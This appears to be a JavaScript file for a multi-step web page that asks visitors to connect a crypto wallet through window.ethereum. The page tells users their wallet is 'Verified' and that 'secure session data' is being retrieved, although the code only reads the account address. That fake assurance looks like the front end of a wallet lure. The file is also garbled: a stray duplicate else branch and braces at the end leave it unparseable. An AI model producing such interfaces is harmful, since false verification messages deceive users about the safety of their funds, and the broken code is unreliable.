window.addEventListener('DOMContentLoaded', () => {
    
    // Step 1 -> Step 2
    const toStep2 = document.getElementById('toStep2');
    if (toStep2) {
        toStep2.onclick = () => {
            document.getElementById('step-1').classList.add('hidden');
            document.getElementById('step-2').classList.remove('hidden');
        };
    }

    // Step 2 -> Step 3
    const toStep3 = document.getElementById('toStep3');
    if (toStep3) {
        toStep3.onclick = () => {
            document.getElementById('step-2').classList.add('hidden');
            document.getElementById('step-3').classList.remove('hidden');
        };
    }

// Wallet Logic
    const connectBtn = document.getElementById('connectBtn');
    if (connectBtn) {
        connectBtn.onclick = async () => {
            const status = document.getElementById('status');
            if (window.ethereum) {
                try {
                    status.innerText = "Verifying wallet...";
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    
                    // This is the "Verified" message the user sees
                    status.innerText = "Wallet Verified: " + accounts[0].substring(0, 6) + "...";
                    
                    connectBtn.innerText = "Continue to Vault";
                    connectBtn.onclick = () => {
                        status.innerText = "Retrieving secure session data...";
                    };
                } catch (err) {
                    status.innerText = "Verification failed. Please try again.";
                }
            } else {
                status.innerText = "Wallet not detected. Please install a compatible wallet.";
            }
        };
    }
            } else {
                status.innerText = "Web3 wallet not detected. Install Coinbase Wallet.";
            }
        };
    }
});
